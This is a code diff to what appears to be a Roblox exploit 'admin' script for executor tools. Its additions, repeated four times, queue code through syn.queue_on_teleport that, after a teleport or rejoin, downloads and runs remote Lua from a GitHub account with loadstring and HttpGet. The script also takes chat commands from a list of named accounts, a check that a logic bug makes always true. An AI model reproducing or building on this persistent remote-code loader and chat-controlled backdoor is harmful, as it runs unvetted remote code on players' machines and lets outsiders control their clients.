@@ -652,6 +652,19 @@ target = split[2]
 if target == "all" then 
 Place = game.placeId
 job = game.JobId
+
+local queue_on_teleport =
+queue_on_teleport or
+    syn and
+        syn.queue_on_teleport [[
+       repeat wait() until game:IsLoaded() wait(5) print("ServerHoped or rejoined")
+       
+_G.EnteredKey = true
+       
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/AOH'))()
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/CMD2'))()
+]]
+
 game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
 
 
@@ -662,7 +675,17 @@ else
                    target = v.Name
 if v.Name == TheUser then
 
-
+local queue_on_teleport =
+queue_on_teleport or
+    syn and
+        syn.queue_on_teleport [[
+       repeat wait() until game:IsLoaded() wait(5) print("ServerHoped or rejoined")
+       
+_G.EnteredKey = true
+       
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/AOH'))()
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/CMD2'))()
+]]
 
 Place = game.placeId
 job = game.JobId
@@ -694,6 +717,20 @@ if target == "all" then
 
 Place = game.placeId
 job = game.JobId
+
+local queue_on_teleport =
+queue_on_teleport or
+    syn and
+        syn.queue_on_teleport [[
+       repeat wait() until game:IsLoaded() wait(5) print("ServerHoped or rejoined")
+       
+_G.EnteredKey = true
+       
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/AOH'))()
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/CMD2'))()
+]]
+
+
 game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
 
 
@@ -702,7 +739,17 @@ else
                  if v.Name:lower():sub(1,#target) == target:lower() then
                    target = v.Name
 if v.Name == TheUser then
-
+local queue_on_teleport =
+queue_on_teleport or
+    syn and
+        syn.queue_on_teleport [[
+       repeat wait() until game:IsLoaded() wait(5) print("ServerHoped or rejoined")
+       
+_G.EnteredKey = true
+       
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/AOH'))()
+loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/CMD2'))()
+]]
 
 Place = game.placeId
 job = game.JobId
@@ -722,6 +769,7 @@ end
 
   TheUser = game:GetService("Players").LocalPlayer.Name
 game.Players.PlayerAdded:connect(function(Player)
+name = Player.Name
     Player.Chatted:connect(function(mes)
 if Player.Name ==  "bifungiji" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX" or "68248a73250" or "sokomakok"     then
 mes = string.lower(mes)
@@ -762,6 +810,7 @@ end)
   TheUser = game:GetService("Players").LocalPlayer.Name
 for i,v in pairs(game.Players:GetChildren()) do
     	v.Chatted:Connect(function(mes)
+      name = v.Name
 if v.Name ==  "bifungiji" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "68248a73250"   or "sokomakok"   then
 mes = string.lower(mes)
 name = v.Name
